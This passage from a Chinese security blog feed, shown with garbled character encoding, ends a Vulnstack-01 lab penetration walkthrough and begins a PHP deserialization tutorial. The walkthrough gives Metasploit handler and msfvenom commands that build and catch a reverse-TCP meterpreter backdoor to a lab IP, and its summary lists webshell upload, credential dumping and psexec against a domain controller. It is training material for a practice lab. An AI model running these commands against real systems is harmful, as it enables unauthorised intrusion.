post/windows/manage/enable_rdp</code>å³å¯å¼€å¯é¶æœºçš„è¿œç¨‹æ¡Œé¢ã€‚</li></ul><h2 id="6-2-è¿œç¨‹è¿æ¥3389ç«¯å£"><a href="#6-2-è¿œç¨‹è¿æ¥3389ç«¯å£" class="headerlink" title="6.2 è¿œç¨‹è¿æ¥3389ç«¯å£"></a>6.2 è¿œç¨‹è¿æ¥3389ç«¯å£</h2><p>æˆ‘è¿™é‡Œç”¨å¾®è½¯æä¾›çš„<code>Windows App Beta</code>è¿œç¨‹è¿æ¥DMZåŒºçš„webæœåŠ¡å™¨çš„3389ç«¯å£ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.43.40.png" style="zoom:50%;"><p>è¿‡ç¨‹ä¸­å¦‚æœéœ€è¦æ›´æ”¹å¯†ç ï¼Œé‚£å°±æŒ‰ç…§æç¤ºä¿®æ”¹ä¸€ä¸‹<code>sxksec@2025</code>ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.50.28.png" style="zoom:40%;"><p>æˆåŠŸé€šè¿‡RDPè¿œç¨‹ç™»å½•åˆ°win7ä¸­ã€‚</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.51.03.png" style="zoom:30%;"><blockquote><h4 id="Windows-App-Betaä¸‹è½½é“¾æ¥ï¼š"><a href="#Windows-App-Betaä¸‹è½½é“¾æ¥ï¼š" class="headerlink" title="Windows App Betaä¸‹è½½é“¾æ¥ï¼š"></a>Windows App Betaä¸‹è½½é“¾æ¥ï¼š</h4><p><a href="https://install.appcenter.ms/orgs/rdmacios-k2vy/apps/microsoft-remote-desktop-for-mac/distribution_groups/all-users-of-microsoft-remote-desktop-for-mac">https://install.appcenter.ms/orgs/rdmacios-k2vy/apps/microsoft-remote-desktop-for-mac/distribution_groups/all-users-of-microsoft-remote-desktop-for-mac</a></p></blockquote><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2014.43.58.png" style="zoom:50%;"><p>ç‚¹å‡»ç»§ç»­ã€‚</p><h1 id="ä¸ƒã€å†…ç½‘æ¸—é€"><a href="#ä¸ƒã€å†…ç½‘æ¸—é€" class="headerlink" title="ä¸ƒã€å†…ç½‘æ¸—é€"></a>ä¸ƒã€å†…ç½‘æ¸—é€</h1><h2 id="7-1-CSè”åŠ¨MSFåå¼¹meterpreterè¿æ¥"><a href="#7-1-CSè”åŠ¨MSFåå¼¹meterpreterè¿æ¥" class="headerlink" title="7.1 CSè”åŠ¨MSFåå¼¹meterpreterè¿æ¥"></a>7.1 CSè”åŠ¨MSFåå¼¹meterpreterè¿æ¥</h2><h3 id="7-1-1-MSFå¼€å¯ç›‘å¬"><a href="#7-1-1-MSFå¼€å¯ç›‘å¬" class="headerlink" title="7.1.1 MSFå¼€å¯ç›‘å¬"></a>7.1.1 MSFå¼€å¯ç›‘å¬</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfconsoleuse exploit/multi/handler<span class="token builtin class-name">set</span> payload windows/meterpreter/reverse_tcp<span class="token builtin class-name">set</span> lhost <span class="token number">172.20</span>.10.4<span class="token builtin class-name">set</span> lport <span class="token number">7777</span>run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2015.46.17.png" style="zoom:40%;"><h3 id="7-1-2-CSåˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨"><a href="#7-1-2-CSåˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨" class="headerlink" title="7.1.2 CSåˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨"></a>7.1.2 CSåˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨</h3><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2015.48.33.png" style="zoom:50%;"><p>ipå’Œç«¯å£å°±æ˜¯msfç›‘å¬çš„ipå’Œç«¯å£ï¼Œå¯ä»¥å°†è¿™ä¸ªCSçš„å¤–éƒ¨ç›‘å¬å™¨ç†è§£ä¸ºä¸€ä¸ªä¼šè¯çš„å®¹å™¨ï¼Œç¨åæ´¾ç”Ÿçš„ä¼šè¯ä¼šé™„ç€åœ¨è¿™ä¸ªå®¹å™¨ä¸­ï¼Œç„¶åé€šè¿‡è¿™ä¸ªå¤–éƒ¨ç›‘å¬å™¨å°†ä¼šè¯è½¬æ¥åˆ°MSFçš„çš„ç›‘å¬è¿æ¥ä¸Šã€‚</p><h3 id="7-1-3-æ´¾ç”Ÿä¼šè¯"><a href="#7-1-3-æ´¾ç”Ÿä¼šè¯" class="headerlink" title="7.1.3 æ´¾ç”Ÿä¼šè¯"></a>7.1.3 æ´¾ç”Ÿä¼šè¯</h3><p>å³é”®é€‰æ‹©æ´¾ç”Ÿä¼šè¯ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2015.54.53.png" style="zoom:50%;"><p>é€‰æ‹©åˆ›å»ºçš„å¤–éƒ¨ç›‘å¬å™¨ï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2015.55.41.png" style="zoom:50%;"><p>MSFè·å–åˆ°meterpreter shellï¼š</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2015.57.16.png" style="zoom:50%;"><h2 id="7-2-msfvenom-åˆ›å»ºåé—¨åå¼¹meterpreterè¿æ¥"><a href="#7-2-msfvenom-åˆ›å»ºåé—¨åå¼¹meterpreterè¿æ¥" class="headerlink" title="7.2 msfvenom åˆ›å»ºåé—¨åå¼¹meterpreterè¿æ¥"></a>7.2 msfvenom åˆ›å»ºåé—¨åå¼¹meterpreterè¿æ¥</h2><h3 id="7-2-1-msfvenomåˆ›å»ºåé—¨"><a href="#7-2-1-msfvenomåˆ›å»ºåé—¨" class="headerlink" title="7.2.1 msfvenomåˆ›å»ºåé—¨"></a>7.2.1 <code>msfvenom</code>åˆ›å»ºåé—¨</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom <span class="token parameter variable">-p</span> windows/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">172.20</span>.10.4  <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">7777</span> <span class="token parameter variable">-f</span> exe <span class="token parameter variable">-o</span> msfvenom.exe <span class="token comment">#kalié‡Œç”Ÿæˆmsfåé—¨æ–‡ä»¶ shell.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2016.02.57.png" style="zoom:50%;"><h3 id="7-2-2-æ‰§è¡Œæœ¨é©¬åå¼¹meterpreter"><a href="#7-2-2-æ‰§è¡Œæœ¨é©¬åå¼¹meterpreter" class="headerlink" title="7.2.2 æ‰§è¡Œæœ¨é©¬åå¼¹meterpreter"></a>7.2.2 æ‰§è¡Œæœ¨é©¬åå¼¹meterpreter</h3><p>èšå‰‘ä¸Šä¼ åˆ° win7ä¸Š å¹¶æ‰§è¡Œ:</p><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2016.05.48.png" style="zoom:50%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2016.07.50.png" style="zoom:60%;"><img src="/2025/02/13/zong-he-shen-tou/vulnstack-01-ba-chang-zong-he-shen-tou/%E6%88%AA%E5%B1%8F2025-02-18%2016.08.13.png" style="zoom:50%;"><p>å¯ä»¥çœ‹åˆ°ä¹Ÿå¯ä»¥æˆåŠŸè·å–åˆ°meterpreterçš„shellã€‚</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ¸—é€è·¯å¾„å›é¡¾ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">è¾¹ç•Œçªç ´ï¼š<span class="token number">1</span>ï¼‰è¾¹ç•Œç¡®å®šï¼š-<span class="token operator">&gt;</span>æ‹¿åˆ°DMZè¾¹ç•Œä¸»æœºçš„IP<span class="token number">2</span>ï¼‰è¾¹ç•Œç«¯å£æ‰«æï¼š-<span class="token operator">&gt;</span>nmapç«¯å£æ‰«æ-<span class="token operator">&gt;</span>å‘ç°80ã€3306ç­‰æ•æ„Ÿç«¯å£<span class="token number">3</span>ï¼‰webæœåŠ¡ä¿¡æ¯æ”¶é›†ï¼š-<span class="token operator">&gt;</span>phpæ¢é’ˆ-<span class="token operator">&gt;</span>å‘ç°mysqlå’Œphpmyadminå¼±å£ä»¤:root/root<span class="token number">4</span>ï¼‰webæœåŠ¡ä¿¡æ¯æ”¶é›†ï¼š-<span class="token operator">&gt;</span>è·å–åå°ç™»å½•è·¯å¾„å’Œå‡­æ®<span class="token number">5</span>ï¼‰webåå°æ¼æ´æŒ–æ˜ï¼š-<span class="token operator">&gt;</span>æ–‡ä»¶ä¸Šä¼ æ¼æ´-<span class="token operator">&gt;</span>å†™å…¥æœ¨é©¬getshell <span class="token number">6</span>ï¼‰DMZåŒºåæ¸—é€ï¼š-<span class="token operator">&gt;</span>CSä¸Šçº¿ã€å‡­æ®æŠ“å–ã€psexecæ”»å‡»åŸŸæ§ã€ç¬¬ä¸€æ¡è·¯å¾„æ‰“é€šâœ…ã€‘å†…ç½‘æ¸—é€ï¼š<span class="token number">1</span>ï¼‰å†…ç½‘æ¸—é€ï¼š-<span class="token operator">&gt;</span>åŸŸå†…ä¿¡æ¯æ”¶é›†-<span class="token operator">&gt;</span>DMZwebå¼€å¯3389ç«¯å£-<span class="token operator">&gt;</span>è¿œç¨‹ç™»å½•DMZåŒºwebæœåŠ¡å™¨<span class="token number">2</span>ï¼‰meterpreterè·å–ï¼šCSè”åŠ¨MSFã€msfvenomç”Ÿæˆåé—¨ã€‚<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ç»¼åˆæ¸—é€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ç»¼åˆæ¸—é€ </tag>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ååºåˆ—åŒ–æ¼æ´</title>
      <link href="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/"/>
      <url>/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€ä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–"><a href="#ä¸€ã€ä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–" class="headerlink" title="ä¸€ã€ä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–"></a>ä¸€ã€ä¸ºä»€ä¹ˆè¦è¿›è¡Œåºåˆ—åŒ–</h1><p> ç™¾åº¦ç™¾ç§‘ä¸Šåºåˆ—åŒ–å®šä¹‰æ˜¯ï¼Œå°†å¯¹è±¡çš„çŠ¶æ€ä¿¡æ¯è½¬æ¢ä¸ºå¯ä»¥å­˜å‚¨æˆ–ä¼ è¾“çš„å½¢å¼ï¼ˆå­—ç¬¦ä¸²ï¼‰çš„è¿‡ç¨‹ã€‚åœ¨åºåˆ—åŒ–æœŸé—´ï¼Œå¯¹è±¡å°†å…¶å½“å‰çŠ¶æ€å†™å…¥åˆ°ä¸´æ—¶æˆ–æŒä¹…æ€§å­˜å‚¨åŒºï¼ˆRedis é”®å€¼å¯¹æ•°æ®åº“ï¼Œå¸¸ç”¨äºåšç¼“å­˜ï¼‰ã€‚ä»¥åï¼Œå¯ä»¥é€šè¿‡ä»å­˜å‚¨åŒºä¸­è¯»å–æˆ–ååºåˆ—åŒ–å¯¹è±¡çš„çŠ¶æ€ï¼Œé‡æ–°åˆ›å»ºè¯¥å¯¹è±¡ã€‚</p><p> ç®€å•çš„è¯´ï¼Œåºåˆ—åŒ–å°±æ˜¯æŠŠä¸€ä¸ªå¯¹è±¡å˜æˆå¯ä»¥ä¼ è¾“çš„å­—ç¬¦ä¸²ï¼Œå¯ä»¥ä»¥ç‰¹å®šçš„æ ¼å¼åœ¨è¿›ç¨‹ä¹‹é—´è·¨å¹³å°ã€å®‰å…¨çš„è¿›è¡Œé€šä¿¡ã€‚</p><blockquote><h4 id="EX-åˆ›å»ºPHPç±»å’Œå¯¹è±¡"><a href="#EX-åˆ›å»ºPHPç±»å’Œå¯¹è±¡" class="headerlink" title="EX:åˆ›å»ºPHPç±»å’Œå¯¹è±¡"></a>EX:åˆ›å»ºPHPç±»å’Œå¯¹è±¡</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Stutent</span><span class="token punctuation">{</span><span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$score</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sxk</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Stutent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$lyl</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Stutent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"sxk"</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">=</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">score</span><span class="token operator">=</span><span class="token number">90</span><span class="token punctuation">;</span><span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">=</span><span class="token string double-quoted-string">"lyl"</span><span class="token punctuation">;</span><span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token operator">=</span><span class="token number">21</span><span class="token punctuation">;</span><span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">sex</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span><span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">score</span><span class="token operator">=</span><span class="token number">95</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' s age ="</span><span class="token operator">.</span><span class="token variable">$lyl</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">name</span><span class="token operator">.</span><span class="token string double-quoted-string">"' s age ="</span><span class="token operator">.</span><span class="token variable">$sxk</span><span class="token operator">-&gt;</span><span class="token property">age</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$lyl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-23%20%E4%B8%8B%E5%8D%884.28.29.png" style="zoom:45%;"></blockquote><h1 id="äºŒã€PHP-ååºåˆ—åŒ–æ¼æ´"><a href="#äºŒã€PHP-ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="äºŒã€PHP ååºåˆ—åŒ–æ¼æ´"></a>äºŒã€PHP ååºåˆ—åŒ–æ¼æ´</h1><h2 id="2-1-æ¦‚è¿°"><a href="#2-1-æ¦‚è¿°" class="headerlink" title="2.1 æ¦‚è¿°"></a>2.1 æ¦‚è¿°</h2><p>PHPååºåˆ—åŒ–æ¼æ´ä¹Ÿå«PHPå¯¹è±¡æ³¨å…¥ï¼Œæ˜¯ä¸€ä¸ªéå¸¸å¸¸è§çš„æ¼æ´ï¼Œè¿™ç§ç±»å‹çš„æ¼æ´è™½ç„¶æœ‰äº›éš¾ä»¥åˆ©ç”¨ï¼Œä½†ä¸€æ—¦åˆ©ç”¨æˆåŠŸå°±ä¼šé€ æˆéå¸¸å±é™©çš„åæœã€‚æ¼æ´çš„å½¢æˆçš„æ ¹æœ¬åŸå› æ˜¯ç¨‹åºæ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„åºåˆ—åŒ–å­—ç¬¦ä¸²è¿›è¡Œæ£€æµ‹ï¼Œå¯¼è‡´ååºåˆ—åŒ–è¿‡ç¨‹å¯ä»¥è¢«æ¶æ„æ§åˆ¶ï¼Œè¿›è€Œé€ æˆä»£ç æ‰§è¡Œã€getshellç­‰ä¸€ç³»åˆ—ä¸å¯æ§çš„åæœã€‚</p><p> ååºåˆ—åŒ–æ¼æ´å¹¶ä¸æ˜¯PHPç‰¹æœ‰ï¼Œä¹Ÿå­˜åœ¨äºJavaã€Pythonç­‰è¯­è¨€ä¹‹ä¸­ï¼Œä½†å…¶åŸç†åŸºæœ¬ç›¸é€šã€‚</p><p>PHP ä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼ŒåŸºæœ¬éƒ½æ˜¯å›´ç»•<code>serialize()</code>å’Œ<code>unserialize()</code> ä¸¤ä¸ªå‡½æ•°å±•å¼€çš„ã€‚åœ¨ä»‹ç»è¿™ä¸¤ä¸ªå‡½æ•°ä¹‹å‰ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ã€‚</p><h2 id="2-2-ç®€å•çš„åºåˆ—åŒ–ä¾‹å­"><a href="#2-2-ç®€å•çš„åºåˆ—åŒ–ä¾‹å­" class="headerlink" title="2.2 ç®€å•çš„åºåˆ—åŒ–ä¾‹å­"></a>2.2 ç®€å•çš„åºåˆ—åŒ–ä¾‹å­</h2><p> æˆ‘ä»¬å¯ä»¥ç”¨jsonï¼ˆæ ¼å¼åŒ–çš„å­—ç¬¦ä¸²ï¼‰æ ¼å¼æ•°æ®çš„ç¼–ç ä¸è§£ç ï¼Œæ¥ç†è§£åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚è™½ç„¶json æ•°æ®ä¸ååºåˆ—åŒ–æ¼æ´æ²¡æœ‰ä»€ä¹ˆå…³ç³»ï¼Œä½†æ˜¯è¿™ä¸ªä¾‹å­ä¼šå¸®åŠ©æˆ‘ä»¬ç†è§£ã€‚</p><p>æµ‹è¯•ä»£ç å¦‚ä¸‹ï¼šâš ï¸ï¼šecho ä¸èƒ½è¾“å‡ºæ•°ç»„</p><p>æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„å±äºæŠ½è±¡çš„æ•°æ®ç»“æ„ï¼Œä¸ºäº†æ–¹ä¾¿è·¨å¹³å°ä¼ è¾“æ•°æ®ï¼Œå¯ä»¥å°†å…¶è¿›è¡Œjson ç¼–ç ã€‚json æ ¼å¼çš„æ•°æ®æ˜¯ä»¥é”®å€¼å¯¹çš„å½¢å¼å‡ºç°çš„ã€‚ç»“æœå¦‚ä¸‹ï¼š</p><blockquote><h4 id="EXï¼šjson-â€”â€”æ”¾ä¾¿è·¨å¹³å°ä¼ è¾“çš„æ•°æ®ç»“æ„"><a href="#EXï¼šjson-â€”â€”æ”¾ä¾¿è·¨å¹³å°ä¼ è¾“çš„æ•°æ®ç»“æ„" class="headerlink" title="EXï¼šjson â€”â€”æ”¾ä¾¿è·¨å¹³å°ä¼ è¾“çš„æ•°æ®ç»“æ„"></a>EXï¼šjson â€”â€”æ”¾ä¾¿è·¨å¹³å°ä¼ è¾“çš„æ•°æ®ç»“æ„</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$stu</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'name'</span><span class="token operator">=&gt;</span><span class="token string single-quoted-string">'AJEST'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'age'</span><span class="token operator">=&gt;</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'SEX'</span><span class="token operator">=&gt;</span><span class="token constant boolean">true</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'score'</span><span class="token operator">=&gt;</span><span class="token number">89.9</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$stu</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;hr /&gt;"</span><span class="token punctuation">;</span><span class="token variable">$stu_json</span><span class="token operator">=</span><span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$stu</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$stu_json</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2025/02/13/web-an-quan/fan-xu-lie-hua-lou-dong/%E6%88%AA%E5%B1%8F2021-07-24%20%E4%B8%8B%E5%8D%881.11.53.png" style="zoom:45%;"></blockquote><h2 id="2-3-åºåˆ—åŒ–Demo"><a href="#2-3-åºåˆ—åŒ–Demo" class="headerlink" title="2.3 åºåˆ—åŒ–Demo"></a>2.3 åºåˆ—åŒ–Demo</h2><p>  åºåˆ—åŒ–ä¼šå°†ä¸€ä¸ªæŠ½è±¡çš„å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p><p>æˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ªDemo æ¥è¯´æ˜åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œé¦–å…ˆåˆ›å»ºä¸€ä¸ªç±»ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Stu</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$sex</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$score</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç±»åæ˜¯Stuï¼Œè¯¥ç±»ä¸­æœ‰å››ä¸ªå˜é‡ï¼ˆå…³äºå˜é‡çš„æ€§è´¨ï¼Œæˆ‘ä»¬è¿™é‡Œä¸è®¨è®ºã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å¯ä»¥å°†è¿™ä¸ªç±»å®ä¾‹åŒ–ï¼Œä¹Ÿå°±æ˜¯åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ç»™å¯¹è±¡ä¸­å˜é‡èµ‹å€¼ã€‚ä»£ç å¦‚ä¸‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"classStu.php"</span><span class="token punctuation">;</span><span class="token variable">$stu1</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stu</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$stu1</span><span class="token operator">-&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"AJEST"</span><span class="token punctuation">;</span>     <span class="token variable">$stu1</span><span class="token operator">-&gt;</span><span class="token property">sex</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>     <span class="token variable">$stu1</span><span class="token operator">-&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token number">18</span><span class="token punctuation">;</span>     <span class="token variable">$stu1</span><span class="token operator">-&gt;</span><span class="token property">score</span> <span class="token operator">=</span> <span class="token number">89.9</span><span class="token punctuation">;</span>     <span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$stu1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ€åæˆ‘ä»¬ä½¿ç”¨serialize()ï¼Œå°†$stu1 è¿™ä¸ªå¯¹è±¡åºåˆ—åŒ–æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚è¿™æ ·çš„å­—ç¬¦ä¸²ã€‚å°±å¾ˆå®¹æ˜“ä¼ è¾“å’Œå­˜å‚¨äº†ã€‚å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">O:3:<span class="token string">"Stu"</span>:4:  //O ä»£è¡¨Object å¯¹è±¡ï¼›3ç±»åæœ‰ä¸‰ä¸ªå­—ç¬¦ï¼›å¯¹è±¡ä¸­æœ‰4ä¸ªå˜é‡<span class="token punctuation">{</span>s:4:<span class="token string">"name"</span><span class="token punctuation">;</span>s:5:<span class="token string">"AJEST"</span><span class="token punctuation">;</span>s:3:<span class="token string">"sex"</span><span class="token punctuation">;</span>b:1<span class="token punctuation">;</span>s:3:<span class="token string">"age"</span><span class="token punctuation">;</span>i:18<span class="token punctuation">;</span>s:5:<span class="token string">"score"</span><span class="token punctuation">;</span>d:89.900000000000006<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŒæ ·ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨unserialize() å‡½æ•°ï¼Œå°†å­—ç¬¦ä¸²ååºåˆ—åŒ–ä¸ºä¸€ä¸ªå¯¹è±¡ã€‚ç”±äºå­—ç¬¦ä¸²ä¸­å«æœ‰åŒå¼•å·ï¼Œæ‰€ä»¥æ­¤å¤„å¯ä»¥ä½¿ç”¨å®šç•Œç¬¦çš„æ–¹æ³•å®šä¹‰å­—ç¬¦ä¸²ã€‚ä»£ç å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string double-quoted-string">"classStu.php"</span><span class="token punctuation">;</span><span class="token variable">$stu1</span><span class="token operator">=</span><span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span><span class="token constant">STR</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"Stu"</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">{</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"name"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"AJEST"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"sex"</span><span class="token punctuation">;</span>b<span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"age"</span><span class="token punctuation">;</span>i<span class="token punctuation">:</span><span class="token number">18</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">5</span><span class="token 